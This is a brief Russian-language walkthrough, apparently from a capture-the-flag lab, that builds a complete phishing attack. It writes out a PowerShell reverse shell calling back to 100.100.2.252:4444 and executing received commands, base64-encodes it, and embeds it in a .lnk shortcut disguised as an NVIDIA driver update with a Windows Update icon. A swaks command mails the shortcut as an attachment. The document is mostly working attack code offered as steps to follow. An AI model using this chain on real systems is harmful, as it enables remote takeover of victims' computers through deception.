
Для начала закодируем нагрузку через powershell

```
# Reverse shell payload
$payload = @'
$client = New-Object System.Net.Sockets.TCPClient("100.100.2.252",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sb = (iex $data 2>&1 | Out-String );
    $stream.Write([text.encoding]::ASCII.GetBytes($sb),0,$sb.Length);
}
'@

# Base64-кодируем payload
 [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwADAALgAxADAAMAAuADIALgAyADUAMgAiACwANAA0
ADQANAApADsACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwAKAFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsA
CgB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACQAZABh
AHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7AAoAIAAgACAAIAAkAHMA
YgAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7AAoAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBn
AF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiACkALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsACgB9AA==
```

Затем создадим файл unlcyb.lnk,в аргументе которого укажем нагрузку
```
$shortcutPath = "$env:USERPROFILE\Desktop\unlcyb.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$shortcut.Arguments = "-nop  -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwADAALgAxADAAMAAuADIALgAyADUAMgAiACwANAA0ADQANAApADsACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwAKAFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsACgB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7AAoAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiACkALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsACgB9AA=="
$shortcut.IconLocation = "C:\Windows\System32\shell32.dll,153" # Иконка "Обновления Windows"
$shortcut.Description = "Обновление драйверов NVIDIA"
$shortcut.WorkingDirectory = "%SystemRoot%\system32"
$shortcut.Save()
```

Запустим слушателя и отправим файл на почту swaks --h-From: "Site" --from "kali@kali.com" --to james@knight.com -tlso --header "Subject: Онлайн портал  " --body "Здравствуйте" --attach @unlcyb.lnk -s 10.10.0.49:587

После получения шелла забираем флаг